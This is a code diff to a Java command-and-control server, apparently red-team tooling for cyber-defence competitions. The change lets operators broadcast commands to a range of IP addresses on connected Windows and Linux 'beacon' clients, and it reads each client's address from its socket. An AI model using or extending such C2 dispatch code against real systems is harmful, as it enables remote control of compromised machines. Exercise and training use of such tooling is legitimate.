@@ -129,11 +129,15 @@ public class BeaconServer implements Runnable{
             for(BeaconClientHandler clientHandler : linuxClientObjects.values()){
                 clientHandler.sendToClient(command);
             }
+        // Range of IPs 
         } else {
-            if(windowsClientObjects.keySet().contains(scope)){
-                windowsClientObjects.get(scope).sendToClient(command);
-            } else if(linuxClientObjects.keySet().contains(scope)){
-                linuxClientObjects.get(scope).sendToClient(command);
+            ArrayList<String> ips = getIPMatches(scope);
+            for (String ip : ips){
+                if(windowsClientObjects.keySet().contains(ip)){
+                    windowsClientObjects.get(ip).sendToClient(command);
+                } else if(linuxClientObjects.keySet().contains(ip)){
+                    linuxClientObjects.get(ip).sendToClient(command);
+                }
             }
         }
     }
@@ -290,16 +294,12 @@ public class BeaconServer implements Runnable{
                 Socket socket = serverSocket.accept();
                 Duplexer duplexer = new Duplexer(socket);
 
-                // First message is from the client is the Operating System, Windows or Linux
+                // Get clients IP Address
+                // getRemoteSocketAddress retruns in the form /IPAddress:Port (i.e. /1.2.3.4:12345)
+                // Just get ride of the / at the start, because we need the port incase a machine is sitting behind nat
+                String IPAddress = socket.getRemoteSocketAddress().toString().substring(1);
                 String OSMessage = duplexer.receive();
                 System.out.println("Inital Message: " + OSMessage);
-
-                // Second Message is from the client to the server, the IP address of the client.
-                // The Client sends it's own IP Address, so that all of the IP addresses are not viewed as NAT'd ip addresses
-                // In competitions the private IP addresses have a lot of meaning, typically they will follow some format 
-                // 10.a.b.c, where a = team number, b = OS (1 = Windows, 2 = Linux), and c will be the specific host
-                String IPAddress = duplexer.receive();
-                System.out.println("IP Address: " + IPAddress);
                 
                 if(OSMessage.equals("Windows") || OSMessage.equals("Linux")){
                     // Send message to C2 announcing that a new client has been obtained
